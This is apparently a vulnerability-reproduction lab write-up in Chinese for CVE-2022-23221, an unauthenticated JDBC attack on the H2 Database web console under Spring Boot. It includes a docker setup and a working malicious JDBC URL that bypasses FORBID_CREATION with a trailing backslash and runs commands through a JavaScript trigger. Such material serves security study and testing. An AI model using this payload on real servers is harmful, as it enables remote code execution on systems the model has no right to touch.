# H2 Database Web Console未授权JDBC攻击导致远程代码执行（CVE-2022-23221）

H2 Database是一个快速、开源的基于Java的关系型数据库管理系统（RDBMS），可用于嵌入式（集成在Java应用中）和客户端-服务器模式。

当Spring Boot集成H2 Database时，如果设置如下选项，将会启用Web管理页面：

```
spring.h2.console.enabled=true
spring.h2.console.settings.web-allow-others=true
```

在1.4.198版本中，H2 Web控制台限制了文件数据库的创建和内存数据库的连接，从而修复了[CVE-2018-10054](../CVE-2018-10054)漏洞。然而，在1.4.198至2.1.210（不含）版本中，攻击者仍可通过JDBC攻击和一些技巧绕过该限制，进而执行任意代码。

参考链接：

- <https://conference.hitb.org/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&%20Chen%20Hongkun.pdf>
- <https://www.leavesongs.com/PENETRATION/talk-about-h2database-rce.html>
- <https://github.com/h2database/h2database/releases/tag/version-2.1.210>
- <https://github.com/h2database/h2database/pull/1580>
- <https://github.com/h2database/h2database/pull/1726>

## 环境搭建

执行如下命令启动一个集成了H2 Database 2.0.206版本的Spring Boot：

```
docker compose up -d
```

容器启动后，Spring Boot服务监听在`http://your-ip:8080`，H2管理页面默认地址为`http://your-ip:8080/h2-console/`。

## 漏洞复现

在复现本漏洞前，可以先确认[CVE-2018-10054](../CVE-2018-10054)中的payload已无法利用，因为1.4.197之后内存数据库被禁用：

![](1.png)

自1.4.197版本起，H2控制台会默认在JDBC URL后追加`;FORBID_CREATION=TRUE`，阻止文件数据库的创建和内存数据库的连接。但攻击者可以在JDBC URL末尾添加一个反斜杠`\`，扰乱URL语法，使FORBID_CREATION被忽略。

结合该技巧与JDBC攻击，可以构造如下恶意JDBC URL：

```
jdbc:h2:mem:test;MODE=MSSQLServer;FORBID_CREATION=FALSE;INIT=CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript
    var is = java.lang.Runtime.getRuntime().exec("id").getInputStream()
    var scanner = new java.util.Scanner(is).useDelimiter("\\A")
    throw new java.lang.Exception(scanner.next())
$$;AUTHZPWD=\
```

在Web控制台登录时，使用上述URL即可执行任意命令（注意换行）：

![](2.png)
